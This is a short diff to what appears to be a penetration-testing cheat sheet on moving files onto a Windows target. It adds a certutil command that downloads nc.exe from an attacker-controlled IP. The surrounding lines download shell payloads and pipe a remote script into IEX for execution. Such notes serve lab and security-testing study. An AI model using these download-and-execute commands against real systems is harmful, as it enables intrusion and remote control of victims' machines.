@@ -18,6 +18,8 @@ Import a file: (from a windows target host)
 ```powershell
 certutil.exe -urlcache -split -f http://$ipAtacker:8080/shell.bat shell.bat
 
+certutil.exe -urlcache -split -f http://192.168.45.172:8000/nc.exe "C:\Users\tony\Desktop\nc.exe"
+
 certutil.exe -urlcache -split -f http://172.16.8.120:6666/dc_shell.exe dc_shell.exe
 
 Invoke-WebRequest http://172.16.8.120:8765/dc_shell.exe -UseBasicParsing | IEX
